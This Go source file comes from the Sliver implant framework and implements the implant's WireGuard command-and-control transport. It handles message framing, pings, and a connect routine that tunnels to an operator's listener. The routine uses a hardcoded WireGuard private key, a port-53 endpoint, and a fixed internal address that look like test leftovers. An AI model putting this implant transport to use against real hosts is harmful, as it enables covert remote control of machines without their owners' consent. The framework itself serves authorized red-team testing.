package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.WGc2Enabled}}

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/golang/protobuf/proto"
	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/tun/netstack"
)

// socketWGWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func socketWGWriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

func socketWGWritePing(connection net.Conn) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&sliverpb.Ping{Nonce: 31337})
	envelope := sliverpb.Envelope{
		Type: sliverpb.MsgPing,
		Data: pingBuf,
	}
	return socketWGWriteEnvelope(connection, &envelope)
}

// socketWGReadEnvelope - Reads a message from the TLS connection using length prefix framing
func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(dataLengthBuf) == 0 || connection == nil {
		panic("[[GenerateCanary]]")
	}
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

// wgConnect - Get a wg connection or die trying
func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, error) {
	tun, tnet, err := netstack.CreateNetTUN(
		[]net.IP{net.ParseIP("192.168.2.2")},
		[]net.IP{net.ParseIP("8.8.8.8")},
		1420)
	if err != nil {
		log.Panic(err)
	}
	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(device.LogLevelVerbose, ""))
	dev.IpcSet(`private_key=80da6fe746c8938a4b977577c8d5be866c89cb9bd02c0b76906cc43ed9a6b941
public_key=2809add9a89b4e2768076e684653640cda272d84b77b05709e55a50f09b9d65e
endpoint=192.168.1.9:53
allowed_ip=0.0.0.0/0
`)
	err = dev.Up()
	if err != nil {
		log.Panic(err)
	}

	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", "192.168.2.1", 8888))
	// connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", address, port))
	// connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, nil, err
	}
	return connection, dev, nil
}

// {{end}} -WGc2Enabled
